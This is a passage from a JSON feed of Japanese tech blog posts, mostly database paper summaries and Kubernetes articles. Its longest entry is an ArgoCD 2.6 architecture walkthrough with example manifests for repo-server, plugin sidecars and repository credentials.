があるといったメリットがあります。一度だけでも作ってみるのはおすすめです。（自分に合わなければ、2度目をなくせばいいだけ）","isoDate":"2023-06-04T08:24:14.000Z","dateMiliSeconds":1685867054000,"authorName":"Kobayashi Shun","authorId":"moz-sec"},{"title":"Redis公式のGoクライアントライブラリrueidisを試してみた","link":"https://qiita.com/bayobayo0324/items/8ac3e27eef360a316ad2","contentSnippet":"This 記事 is 何？Twitterぼんやり見てたらRedis公式のGo用クライアントライブラリが出てたとかで、自身のプロジェクトにどの程度簡単に入れられるのかなーと思い試してみました。公式によると今使っているgo-redisよりも速い！とのことだったので✨基本...","isoDate":"2023-05-31T12:02:25.000Z","dateMiliSeconds":1685534545000,"authorName":"bayobayo0324","authorId":"bayobayo0324"},{"title":"OLAPデータベースを支える技術","link":"https://zenn.dev/nnaka2992/articles/technics_behind_analytical_database","contentSnippet":"今年に入ってからCarnegie Mellon UniversityのAdvanced Database SystemsでReading Assignmentとして出ている論文リストで必須とされているものや講義資料を読みました。https://nnaka2992.hatenablog.com/archive/category/論文この記事では紹介されていた論文やAdvanced Database Systemsの講義資料・動画を振り替えることで、BigQueryやRedShift、Snowflakeといった最新の分析用データベースがどのように優れたパフォーマンスを実現しているかを考え...","isoDate":"2023-05-25T00:02:49.000Z","dateMiliSeconds":1684972969000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"現在のDremelの実装を解説した論文を読みました ","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/17_dremel","contentSnippet":"この記事の趣旨2020年に発表されたBigQueryの元となったGoogle内で利用されている分析向けデータベースであるDremelの実装を解説した論文を読みました。Dremel: A Decade of Interactive SQL Analysis at Web Scale著者についてSergey Melnik, Andrey Gubarev, Jing Jing Long, Geoffrey Romer, Shiva Shivakumar, Matt Tolton,Theo Vassilakisら2010年のDremel発表論文の著者らと、Hossein Ahmadi, Dan Delorey, Slava Min, Mosha Pasumansky, Jeff ShuteらGoogleで分析ワークロードと分散処理に関わる著者らによる論文。概要BigQueryの元となったGoogleのDremelの10年間を振り替えってアーキテクチャについて説明した論文。Dremelは現代のクラウドネイティブ分析ツールで一般的になっている、計算リソースとストレージの分解、カラムナストレージ、in situデータ分析などを統合した最初のツールである。手法SQLの採用Googleでは殆どのデータはBigTableなどNoSQLデータベースで管理されていたため、SQLを用いないデータアクセスが主流であった。しかしトランザクション型ビッグデータシステムにおける、SQLの採用に共ないDremelでもSQLを採用した。ストレージの分離メモリの分離MapReduceのシャッフルのボトルネックを回避するためにDisaggregated Memory Shuffle Systemを採用した。In situデータ分析への対応DBMSへのデータロードを必要としないデータ分析のことで、DremelではGFSに移行するときにGoogle内で共有のストレージフォーマットを使用することでGoogle内のデータに対応した。加えてGoogle Cloud StorageやGoogle Drive、MySQL、BigTableなどからのデータ取得もフェデレーションとして対応した。サーバレスアーキテクチャフォールトトレラントリスタート、仮想スケジューリングユニットによりマルチテナントかつオンデマンドなリソースを提供可能とし、低価格な利用を可能とした。現在ではサーバレスアーキテクチャを進化させ、集中型スケジューリングやShuffle Persistent Layer、柔軟なDAG実行、動的クエリ実行などを実装することでより優れたサーバレスアーキテクチャを実現した。ネストデータにおけるカラムナストレージ[[32])]Figure 5Figure 6Figure 7クエリレイテンシの最小化インタラクティブな実行のレイテンシは大きくなる。それを解決するためにDremelではスタンバイサーバプール、マルチレベル実行ツリー、列指向スキーマ表現、CPUとIO負荷のバランス調整、ファイルオペレーションの再利用、保証されたキャパシティ、適合的なクエリスケーリングにより実現している。作業時間read27:5027:50author32:024:12summary68:5026:48","isoDate":"2023-05-15T02:14:20.000Z","dateMiliSeconds":1684116860000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Connection draining for Service type LoadBalancer","link":"https://zenn.dev/toversus/articles/1682d275ef1bb7","contentSnippet":"はじめにService リソースは Kubernetes のサービス検出を支えるコアリソースです。Service のデータプレーンとして kube-proxy を使用している場合は、各ノード上の iptables や ipvs を設定することで L4 負荷分散を実現しています。Kubernetes は、結果整合性 (Eventual Consistency) の上に成り立つ分散システムです。Kubernetes のコントロールプレーンが Pod を削除する時に、全てのノード上のルーティングルールを更新してから Pod を削除したりはしません。削除中の Pod にもトラフィックが流...","isoDate":"2023-05-11T09:43:47.000Z","dateMiliSeconds":1683798227000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"TiDBで学ぶNewSQLのアーキテクチャ for Beginners","link":"https://zenn.dev/nnaka2992/articles/learning_tidb_internal_for_beginner","contentSnippet":"はじめにこの記事ではNewSQLの特徴であるノード間の分散とトランザクションや分断耐性などがTiDBではどのような技術によって実現されているかを説明することを目的としています。Spannerの論文が2012年に発表されてから10年以上の年月が流れ、優れた論文や実装ドキュメント、個人による解説ブログなど技術的詳細について述べた資料は多くあります。加えてこの記事を入門的なものと位置づけているため各コンポーネントを網羅的に解説するというよりは、キーコンセプトをどのように実装しているのかを実験を混じえながら動作の実現方法の解説を中心に扱います。また今回はTiDBをベースに説明し...","isoDate":"2023-05-11T01:18:19.000Z","dateMiliSeconds":1683767899000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"クエリオプティマイザの精度を検証した論文を読みました","link":"https://nnaka2992.hatenablog.com/entry/cmu_reading_assignments/16_query_optimization_performance","contentSnippet":"この記事の趣旨2015年に発表されたクエリオプティマイザにおけるカーディナリティ推定とコストモデル、列挙アルゴリズムの貢献度を評価した論文を読んでいきます。How Good Are Query Optimizers, Really?著者についてViktor Leis、Andrey Gubichev、Atanas Mirchev、Peter Boncz、Alfons Kemper、Thomas Neumannらのグループによる論文。ほとんどのメンバーはDBMSにおける最適化について研究しているが、Atanas Mirchevはより統計や探索といった最適化よりの研究をしている。問題意識良い結合順序を見つけることはクエリの性能に対して大きな影響を与えるため、熱心に研究されてきた。古典的なクエリ最適化のアプローチでは以下のステップで動的計画方に基づいた最適化を行なう。1. 有効な結合順序の列挙1. カーディナリティ推定値を入力としたコストモデルの選択理論的にはカーディナリティとコストモデルの推定値が正確であれば、最適なクエリプランを選択することができる。しかし現実にはカーディナリティ推定は一様性や独立性といった単純化された仮定に基づいており、しばしばそのような仮定は間違っているため悲惨な計画を作成する。手法この論文ではカーディナリティ推定器の評価と正確なコストモデルの重要性の評価、そして列挙された結合順序の空間がどの程度影響するのかを以下の方法で検証し、貢献を行なっている。1. IMDBデータを用いたJoin Order BenchmarkというJOINにフォーカスしたベンチマークによる評価を行なう1. 実世界のデータセットにおける現実的なクエリを用いたE2Eの検証を行なう。1. クエリ性能に対するカーディナリティ・コストモデル・列挙アルゴリズムの貢献度を定量化し、最適なクエリプラン生成のためのガイドラインを策定している。作業時間read29:3829:38author33:083:30summary48:4414:36感想時間が無くまとめ途中で切り上げてしまった。やらないよりマシではあるものの、ちゃんと纏めるときにくらべて理解度に影響が出そうなので時間に余裕を持っておきたい。内容自体はGW中にPostgreSQLの実装を読んでいたこともあり、わりと理解しやすかった。","isoDate":"2023-05-08T02:13:43.000Z","dateMiliSeconds":1683512023000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"[Kubernetes 1.27] Dynamic Resource Allocation のいま","link":"https://zenn.dev/toversus/articles/fe2aa06f133b49","contentSnippet":"!Kubernetes 1.27 時点でアルファ機能のため、実装が大きく変わる可能性があります。 はじめにKubeCon Europe 2023 で KEP-3063 Dynamic Resource Allocation (DRA) についての深い話と DRA Resource Driver の実装方法の話があったので、kubernetes-sigs/dra-example-driver をベースに触りながら検証してみました。toVersus/fake-dra-driver で公開しています。Device Plugins 2.0: How to Build a Drive...","isoDate":"2023-05-06T02:11:55.000Z","dateMiliSeconds":1683339115000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"【ArgoCD\uD83D\uDC19】ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/05/02/145115","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️ArgoCDのアーキテクチャを構成するコンポーネントの種類についてArgoCDがマニフェストを自動デプロイする仕組みについてこの記事から得られる知識01. はじめに02. 概要アーキテクチャレイヤーコンポーネント仕組み(1) repo-serverによるクローン取得(2) application-controllerによるマニフェスト取得(3) application-controllerによるCluster確認(4) application-controllerによる処理結果保管(5) argocd-serverによるキャッシュ取得(6) 管理者のログイン(7) IDプロバイダーへの認証フェーズ委譲(8) dex-serverによる認証リクエスト送信(9) argocd-serverによる認可フェーズ実行(10) application-controllerによるマニフェストデプロイ03. repo-serverrepo-serverとは仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピー(2) repo-serverによる認証情報取得(3) repo-serverのよるクローン取得とポーリング(4) repo-serverによるサイドカーコール(5) repo-serverによる暗号化キーと暗号化変数の取得(6) サイドカーによるプラグイン処理の取得(7) サイドカーによるプラグイン処理の実行04. application-controller、redis-serverapplication-controllerとはredis-serverとは仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンド(2) application-controllerによるArgoCD系カスタムリソースのReconciliation(3) application-controllerによるマニフェスト取得(4) application-controllerによるヘルスチェック(5) application-controllerによるマニフェスト差分検出(6) application-controllerによる処理結果保管(7) application-controllerによるマニフェストデプロイ05. dex-serverdex-serverとは仕組み(1) プロダクト用Cluster管理者のログイン(2) IDプロバイダーへの認証フェーズ委譲(3) dex-serverによる認可リクエスト作成(4) dex-serverによる認可リクエスト送信(5) IDプロバイダーによる認証フェーズ実施(6) argocd-serverによる認可フェーズ実施06. argocd-server (argocd-apiserver)argocd-serverとは仕組み(1) application-controllerによるヘルスチェック(2) application-controllerによるマニフェスト差分検出(3) application-controllerによる処理結果保管(4) application-controllerによる処理結果取得(5) プロダクト用Cluster管理者のログイン(6) Ingressコントローラーによるルーティング(7) IDプロバイダーへの認証フェーズ委譲(8) IDプロバイダーによる認証フェーズ実施(9) argocd-serverによる認可フェーズ実施(10) application-controllerによるマニフェストデプロイ07. アーキテクチャのまとめ08. おわりに謝辞記事関連のおすすめ書籍01. はじめにロケットに乗るタコのツラが腹立つわー。画像引用元：Argo Projectさて最近の業務で、全プロダクトの技術基盤開発チームに携わっており、全プロダクト共有のArgoCD\uD83D\uDC19とAWS EKSをリプレイスしました。今回は、採用した設計プラクティスの紹介も兼ねて、ArgoCDのマイクロサービスアーキテクチャと自動デプロイの仕組みを記事で解説しました。ArgoCDは、kubectlコマンドによるマニフェストのデプロイを自動化するツールです。ArgoCDのアーキテクチャには変遷があり、解説するのは執筆時点 (2023/05/02) で最新の 2.6 系のArgoCDです。アーキテクチャや仕組みはもちろん、個々のマニフェストの実装にもちょっとだけ言及します。それでは、もりもり布教していきます\uD83D\uDE1702. 概要アーキテクチャレイヤーまずは、ArgoCDのアーキテクチャのレイヤーがどのようになっているかを見ていきましょう。ArgoCD公式から、コンポーネント図が公開されています。図から、次のようなことがわかります\uD83D\uDC47下位レイヤー向きにしか依存方向がなく、例えばコアドメインとインフラのレイヤー間で依存性は逆転させていない。レイヤーの種類 (UI、アプリケーション、コアドメイン、インフラ) とそれらの依存方向から、レイヤードアーキテクチャのようなレイヤーに分けている。特にコアドメインレイヤーが独立したコンポーネントに分割されており、マイクロサービスアーキテクチャを採用している。argo-cd/docs/developer-guide/architecture/components.md at v2.8.0 \xb7 argoproj/argo-cd \xb7 GitHub▶ ArgoCDのマイクロサービスアーキテクチャの分割単位についてMonolith to Microservices: Evolutionary Patterns to Transform Your Monolith (English Edition)▶ ArgoCDのマイクロサービスアーキテクチャの設計図についてhttps://microsoft.github.io/code-with-engineering-playbook/design/diagram-types/DesignDiagramsTemplates/componentDiagrams/コンポーネント次に、コンポーネントの種類を紹介します。ArgoCDの各コンポーネントが組み合わさり、マニフェストの自動的なデプロイを実現します。ArgoCD (2.6系) のコンポーネントはいくつかあり、主要なコンポーネントの種類とレイヤーは以下の通りです\uD83D\uDC47 コンポーネント                       レイヤー              機能                                                                                                                                                                                                             argocd-server(argocd-apiserver)  UI・アプリケーション  みんながよく知るArgoCDのダッシュボードです。また、ArgoCDのAPIとしても機能します。現在、複数のレイヤーの責務を持っており、将来的にUIとアプリケーションは異なるコンポーネントに分割されるかもしれません。  application-controller               コアドメイン          Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。                                                                                            repo-server                          コアドメイン          マニフェスト/チャートリポジトリからクローンを取得します。また、クローンからマニフェストを作成します。                                                                                                        redis-server                         インフラ              application-controllerの処理結果のキャッシュを保管します。                                                                                                                                                       dex-server                           インフラ              SSOを採用する場合、argocd-serverの代わりに認可リクエストを作成し、またIDプロバイダーに送信します。これにより、argocd-server上の認証フェーズをIDプロバイダーに委譲できます。                                 GitOps and Kubernetes: Continuous Deployment with Argo CD, Jenkins X, and Flux以降の図の凡例です。ArgoCDの各コンポーネント (application-controller、argocd-server、dex-server、repo-server) と各リソース (Application、AppProject) を区別しています。仕組みそれでは、ArgoCDは、どのようにコンポーネントを組み合わせて、マニフェストをデプロイするのでしょうか。ここではプロダクト用Cluster管理者 (デプロイ先となるClusterを管理するエンジニア) は、ArgoCDのダッシュボードを介してマニフェストをデプロイするとしましょう。まずは、概要を説明していきます。(1) repo-serverによるクローン取得ArgoCDのCluster上で、repo-serverがマニフェスト/チャートリポジトリのクローンを取得します。(2) application-controllerによるマニフェスト取得application-controllerは、repo-serverからマニフェストを取得します。(3) application-controllerによるCluster確認application-controllerは、プロダクト用Clusterの現状を確認します。(4) application-controllerによる処理結果保管application-controllerは、処理結果をredis-serverに保管します。(5) argocd-serverによるキャッシュ取得argocd-serverは、redis-serverからキャッシュを取得します。(6) 管理者のログインプロダクト用Cluster管理者は、argocd-serverにログインしようとします。(7) IDプロバイダーへの認証フェーズ委譲argocd-serverは、ログイン時にIDプロバイダーに認証フェーズを委譲するために、dex-serverをコールします。▶ argocd-serverのログイン手法について(8) dex-serverによる認証リクエスト送信dex-serverは、IDプロバイダーに認可リクエストを作成し、これをIDプロバイダーに送信します。(9) argocd-serverによる認可フェーズ実行argocd-serverで認可フェーズを実施します。ログインが完了し、プロダクト用Cluster管理者は認可スコープに応じてダッシュボードを操作できます。▶ ArgoCDをどのClusterで管理するかについて(10) application-controllerによるマニフェストデプロイapplication-controllerは、Clusterにマニフェストをデプロイします。マニフェストのデプロイの仕組みをざっくり紹介しました。ただこれだと全く面白くないため、各コンポーネントの具体的な処理と、各々がどのように通信しているのかを説明します✌️03. repo-serverrepo-serverとはまずは、コアドメインレイヤーにあるrepo-serverです。マニフェスト/チャートリポジトリ (例：GiHub、GitHub Pages、Artifact Hub、AWS ECR、Artifact Registryなど) からクローンを取得します。repo-serverを持つPodには、他に軽量コンテナイメージからなるInitContainerとサイドカー (cmp-server) がおり、それぞれ機能が切り分けられています\uD83D\uDC4D仕組み(1) InitContainerによるお好きなツールインストール & argocd-cliバイナリコピーrepo-serverの起動時に、InitContainerでお好きなマニフェスト管理ツール (Helm、Kustomizeなど) やプラグイン (helm-secrets、KSOPS、SOPS、argocd-vault-pluginなど) をインストールします。また、サイドカーのcmp-serverでは起動時に/var/run/argocd/argocd-cmp-serverコマンドを実行する必要があり、InitContainer (ここではcopyutilコンテナ) を使用して、ArgoCDのコンテナイメージからargocd-cliのバイナリファイルをコピーします。repo-serverのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、ArgoCDで使いたいツール (Helm、SOPS、helm-secrets) をInitContainerでインストールしています。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: argocdspec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  initContainers:    # HelmをインストールするInitContainer    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # SOPSをインストールするInitContainer    - name: sops-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /custom-tools          name: custom-tools    # helm-secretsをインストールするInitContainer    - name: helm-secrets-installer      image: alpine:latest      command:        - /bin/sh        - -c      args:        - |          # インストール処理      volumeMounts:        - mountPath: /helm-working-dir/plugins          name: helm-working-dir    ...    # cmp-serverにargocd-cliのバイナリをコピーするInitContainer    - name: copyutil      image: quay.io/argoproj/argocd:latest      command:        - cp        - -n        - /usr/local/bin/argocd        - /var/run/argocd/argocd-cmp-server      volumeMounts:        - name: var-files          mountPath: /var/run/argocd  # Podの共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}    - name: var-files      emptyDir: {}Custom Tooling - Argo CD - Declarative GitOps CD for Kubernetes▶ ArgoCDのコンテナイメージに組み込まれているツールについてquay.io/argoproj/argocd) には、いくつかのツール (例：Helm、Kustomize、Ks、Jsonnetなど) の推奨バージョンがあらかじめインストールされています。そのため、これらのツールのプラグイン (例：helm-secrets) を使用する場合、上記のコンテナイメージからなるrepo-server内のツールをcmp-serverにコピーすればよいのでは、と思った方がいるかもしれません。この方法は全く問題なく、cmp-serverの/usr/local/binディレクトリ配下にツールをコピーするように、InitContainerを定義してもよいです。apiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest      volumeMounts:        - mountPath: /usr/local/bin/helm          # Podの共有ボリュームを介して、repo-serverでHelmを使用する。          name: custom-tools  initContainers:    - name: copy-helm      image: quay.io/argoproj/argocd:latest      # InitContainer上のHelmをVolumeにコピーする      command:        - /bin/cp        - -n        - /usr/local/bin/helm        - /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  # 共有ボリューム  volumes:    - name: custom-tools      emptyDir: {}反対に、これらツールをInitContainerでインストールし直す場合は、ArgoCD上での推奨バージョンをちゃんとインストールするようにしましょう\uD83D\uDC4D2.6系では、ArgoCDのリポジトリ内のtool-versions.shファイルに、Helmのバージョンが定義されています。spec:  ...  initContainers:    - name: helm-installer      image: alpine:latest      command:        - /bin/sh        - -c      # ArgoCDのリポジトリ上のtool-versions.shファイルから、Helmのバージョンを取得する      args:        - |          apk --update add curl wget          ARGOCD_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-helm/argo-cd-<ArgoCDのバージョン>/charts/argo-cd/Chart.yaml | grep appVersion | sed -e \'s/^[^: ]*: //\')          HELM_RECOMMENDED_VERSION=$(curl -s https://raw.githubusercontent.com/argoproj/argo-cd/\\"${ARGOCD_VERSION}\\"/hack/tool-versions.sh | grep helm3_version | sed -e \'s/^[^=]*=//\')          wget -q https://get.helm.sh/helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          tar -xvf helm-v\\"${HELM_RECOMMENDED_VERSION}\\"-linux-amd64.tar.gz          cp ./linux-amd64/helm /custom-tools/          chmod +x /custom-tools/helm      volumeMounts:        - mountPath: /custom-tools          name: custom-tools  ...argo-cd/hack/tool-versions.sh at v2.6.0 \xb7 argoproj/argo-cd \xb7 GitHub(2) repo-serverによる認証情報取得repo-serverは、Secret (argocd-repo-creds) からリポジトリの認証情報を取得します。argocd-repo-credsではリポジトリの認証情報のテンプレートを管理しています。指定した文字列から始まる (前方一致) URLを持つリポジトリに接続する場合、それらの接続で認証情報を一括して適用できます。argocd-repo-credsのざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、リポジトリのSSH公開鍵認証を採用し、argocd-repo-credsに共通の秘密鍵を設定しています。apiVersion: v1kind: Secretmetadata:  name: argocd-repo-creds-github  namespace: argocd  labels:    argocd.argoproj.io/secret-type: repo-credstype: Opaquedata:  type: git  url: https://github.com/hiroki-hasegawa  # 秘密鍵  sshPrivateKey: |    MIIC2 ...あとは、各リポジトリのSecret (argocd-repo) にURLを設定しておきます。すると、先ほどのargocd-repo-credsのURLに前方一致するURLを持つSecretには、一括して秘密鍵が適用されます。# foo-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: argocd  name: foo-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: bar-repository  # https://github.com/hiroki-hasegawa に前方一致する。  url: https://github.com/hiroki-hasegawa/bar-chart.git---# baz-repositoryをポーリングするためのargocd-repoapiVersion: v1kind: Secretmetadata:  namespace: foo  name: baz-argocd-repo  labels:    argocd.argoproj.io/secret-type: repositorytype: Opaquedata:  # 認証情報は設定しない。  # チャートリポジトリ名  name: baz-repository  # https://github.com/hiroki-hasegawa に前方一致する。  url: https://github.com/hiroki-hasegawa/baz-chart.gitDeclarative Setup - Argo CD - Declarative GitOps CD for Kubernetes(3) repo-serverのよるクローン取得とポーリングrepo-serverは、認証情報を使用して、リポジトリにgit cloneコマンドを実行します。取得したクローンを、/tmp/_argocd-repoディレクトリ配下にUUIDの名前で保管します。また、リポジトリの変更をポーリングし、変更を検知した場合はgit fetchコマンドを実行します。# クローンが保管されていることを確認できる$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/_argocd-repo/<URLに基づくUUID>\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yamlcustom repo-server - where is the local cache kept? \xb7 argoproj argo-cd \xb7 Discussion #9889 \xb7 GitHub▶ repo-serverでのクローン保管先のバージョン差異について2.3以前では、repo-serverは/tmpディレクトリ配下にURLに基づく名前でクローンを保管します。$ kubectl -it exec argocd-repo-server \\\\    -c repo-server \\\\    -n foo \\\\    -- bash -c \\"ls /tmp/https___github.com_hiroki-hasegawa_foo-repository\\"# リポジトリ内のファイルChart.yaml  README.md  templates  values.yaml(4) repo-serverによるサイドカーコールrepo-serverは、自身にマウントされたいくつかのマニフェスト管理ツール (例：Helm、Kustomize) を実行する機能を持っています。しかし、実行できないツールではサイドカー (cmp-server) をコールします。この時、Applicationの.spec.source.pluginキーでプラグイン名を指定すると、そのApplicationではサイドカーをコールします。逆を言えば、プラグイン名を指定していないApplicationは、サイドカーをコールしない です。apiVersion: argoproj.io/v1alpha1kind: Applicationmetadata:  name: foo-application  namespace: foospec:  source:    plugin:      name: helm-secrets # このプラグイン名は、ConfigManagementPluginのmetadata.nameキーに設定したもの  ...このコールは、Volume上のUnixドメインソケットを経由します。Unixドメインソケットのエンドポイントの実体は.sockファイルです。$ kubectl exec -it argocd-repo-server -c foo-plugin-cmp-server\\\\    -- bash -c \\"ls /home/argocd/cmp-server/plugins/\\"foo-plugin.sock▶ UnixソケットドメインについてASCII.jp：Unixドメインソケット (1/2)(5) repo-serverによる暗号化キーと暗号化変数の取得cmp-serverは、暗号化キー (例：AWS KMS、Google CKMなど) を使用してSecretストア (例：AWS SecretManager、Google SecretManager、SOPS、Vaultなど) の暗号化変数を復号化します。▶ クラウドプロバイダーの暗号化キーを使用するために必要な証明書について/etc/sslディレクトリ (ディレクトリはOSによって異なる) に証明書が無く、cmp-serverがHTTPSプロトコルを使用できない可能性があります。その場合は、お好きな方法で証明書をインストールし、コンテナにマウントするようにしてください\uD83D\uDC4DapiVersion: v1kind: Podmetadata:  name: argocd-repo-server  namespace: foospec:  containers:    - name: repo-server      image: quay.io/argoproj/argocd:latest  ...    # サイドカーのcmp-server    - name: helm-secrets-cmp-server      image: ubuntu:latest      ...      volumeMounts:        # サイドカーがAWS KMSを使用する時にHTTPSリクエストを送信する必要があるため、証明書をマウントする        - name: certificate          mountPath: /etc/ssl  ...  initContainers:    - name: certificate-installer      image: ubuntu:latest      command:        - /bin/sh        - -c      args:        - |          apt-get update -y          # ルート証明書をインストールする          apt-get install -y ca-certificates          # 証明書を更新する          update-ca-certificates      volumeMounts:        - mountPath: /etc/ssl          name: certificate  volumes:    - name: certificate      emptyDir: {}(6) サイドカーによるプラグイン処理の取得cmp-serverは、マニフェスト管理ツールのプラグイン (helm-secrets、argocd-vault-pluginなど) を実行します。この時マニフェストの作成時のプラグインとして、ConfigMap配下のConfigManagementPluginでプラグインの処理を定義します。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、プラグインとしてhelm-secretsを採用し、helm secrets templateコマンドの実行を定義します。apiVersion: v1kind: ConfigMapmetadata:  name: argocd-cmp-cm  namespace: foodata:  helm-secrets-plugin.yaml: |    apiVersion: argoproj.io/v1alpha1    kind: ConfigManagementPlugin    metadata:      namespace: foo      name: helm-secrets # このプラグイン名は、Applicationのspec.source.pluginキーで指定したもの    spec:      generate:        command:          - /bin/bash          - -c        args:          - |            set -o pipefail            helm secrets template -f $ARGOCD_ENV_SECRETS -f $ARGOCD_ENV_VALUES -n $ARGOCD_APP_NAMESPACE $ARGOCD_APP_NAME .  foo-plugin.yaml: |    ...▶ ConfigManagementPluginのファイル名について(7) サイドカーによるプラグイン処理の実行cmp-serverはプラグインを実行し、Secretを含むマニフェストを作成します。ConfigMap配下のファイルをplugin.yamlの名前でサイドカーにマウントする必要があります。また、先ほどのUnixドメインソケットの.sockファイルや、 cmp-serverがプラグインを実行するための各バイナリファイルもマウントが必要です。ざっくりした実装例は以下の通りです\uD83D\uDC47ここでは、helm-secretsプラグインを実行するサイドカー (helm-secrets-cmp-server) を作成します。apiVersion: v1kind: Podmetadata:  name: argocd-repo-serverspec:  containers:    # repo-server    - name: repo-server      image: quay.io/argoproj/argocd:latest    ...    # helm-secretsのcmp-server    - name: helm-secrets-cmp-server      # コンテナイメージは軽量にする      image: ubuntu:latest      command:        - /var/run/argocd/argocd-cmp-server      env:        # helmプラグインの場所を設定する        - name: HELM_PLUGINS          value: /helm-working-dir/plugins      securityContext:        runAsNonRoot: true        runAsUser: 999      volumeMounts:        # リポジトリのクローンをコンテナにマウントする        - name: tmp          mountPath: /tmp        # ConfigManagementPluginのマニフェスト (helm-secrets.yaml) を \\"plugin.yaml\\" の名前でコンテナにマウントする        - name: argocd-cmp-cm          mountPath: /home/argocd/cmp-server/config/plugin.yaml          subPath: helm-secrets.yaml        # コンテナ間で通信するためのUnixドメインソケットファイルをコンテナにマウントする        - name: plugins          mountPath: /home/argocd/cmp-server/plugins        # 任意のツールのバイナリファイルをコンテナにマウントする        - name: custom-tools          mountPath: /usr/local/bin        # helmプラグインのバイナリをコンテナにマウントする        - name: helm-working-dir          mountPath: /helm-working-dir/plugins      ...  # Podの共有ボリューム  volumes:    # リポジトリのクローンを含む    - name: tmp      emptyDir: {}    # Helmなどの任意のツールを含む    - name: custom-tools      emptyDir: {}    # helmプラグインを含む    - name: helm-working-dir      emptyDir: {}▶ マウント時のConfigManagementPluginのファイル名についてv2.6では、ConfigManagementPluginのマニフェストを/home/argocd/cmp-server/configディレクトリに、plugin.yamlの名前でマウントしないといけません。これは、cmp-serverの起動コマンド (/var/run/argocd/argocd-cmp-server) がplugin.yamlの名前しか扱えないためです。ArgoCD公式の見解で、サイドカーでは単一のプラグインしか実行できないように設計しているとのコメントがありました。今後のアップグレードで改善される可能性がありますが、v2.6では、ConfigManagementPluginの数だけcmp-serverが必要になってしまいます\uD83D\uDE47\uD83C\uDFFB‍use multiple plugins in sidecar installation method \xb7 argoproj argo-cd \xb7 Discussion #12278 \xb7 GitHub▶ Kustomizeのプラグインをどのコンテナで実行するかについて▶ クラウドプロバイダーのSecretストアを採用する場合についてHow to Manage Kubernetes Secrets with GitOps for Secure Deployments - Akuity Blog04. application-controller、redis-serverapplication-controllerとはコアドメインレイヤーにあるapplication-controllerです。Clusterにマニフェストをデプロイします。また、ArgoCD系カスタムリソースのカスタムコントローラーとしても機能します。redis-serverとはインフラレイヤーにあるredis-serverです。application-controllerの処理結果のキャッシュを保管します。仕組み(1) ArgoCD用Cluster管理者のkubectl applyコマンドArgoCD用Clusterの管理者は、ClusterにArgoCD系のカスタムリソース (例：Application、AppProjectなど)　をデプロイします。▶ ArgoCD自体のデプロイにargo-helmを採用する場合についてGitHub - argoproj/argo-helm: ArgoProj Helm ChartsただしHelmの重要な仕様として、チャートの更新時に使用するhelm upgradeコマンドは、CRDを作成できる一方でこれを変更できません。HelmでCRDを作成するとHelmの管理ラベルが挿入されてしまうため、作成の時点からCRDがHelmの管理外となるように、kubectlコマンドでCRDを作成した方がよいです\uD83D\uDC4D$ kubectl diff -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"$ kubectl apply -k \\"https://github.com/argoproj/argo-cd/manifests/crds?ref=<バージョンタグ>\\"ArgoCD上でHelmを使用してデプロイする場合はこの仕様を気にしなくてよいのかな、と思った方がいるかもしれないです。ですが本記事で解説した通り、ArgoCDはcmp-serverのhelm templateコマンド (この時、--include-crdsオプションが有効になっている) や、application-controllerのkubectl applyコマンドを組み合わせてマニフェストをデプロイしているため、CRDもちゃんと更新してくれます\uD83D\uDC4D\uD83C\uDFFB️Helm | Custom Resource Definitions(2) application-controllerによるArgoCD系カスタムリソースのReconciliationkube-controller-managerは、application-controllerを操作し、Reconciliationを実施します。application-controllerは、Etcd上に永続化されたマニフェストと同じ状態のArgoCD系カスタムリソースを作成/変更します。▶ カスタムコントローラーでもあるapplication-controllerについてHow Operators work in Kubernetes | Red Hat Developer(3) application-controllerによるマニフェスト取得application-controllerは、repo-serverからリポジトリのマニフェストを取得します。取得したマニフェストは、repo-serverのサイドカーであるcmp-serverが作成したものです。(4) application-controllerによるヘルスチェックapplication-controllerは、プロダクト用Clusterをヘルスチェックします。application-controllerには、gitops-engineパッケージが内蔵されており、これはヘルスチェックからデプロイまでの基本的な処理を実行します。▶ gitops-engineパッケージについてv0.7.0 では以下のディレクトリからなります\uD83D\uDC47\uD83D\uDC31 gitops-engine/├── \uD83D\uDCC2 pkg│    ├── cache│    ├── diff   # リポジトリとClusterの間のマニフェストの差分を検出する。ArgoCDのDiff機能に相当する。│    ├── engine # 他のパッケージを使い、GitOpsの一連の処理を実行する。│    ├── health # Clusterのステータスをチェックする。ArgoCDのヘルスチェック機能に相当する。│    ├── sync  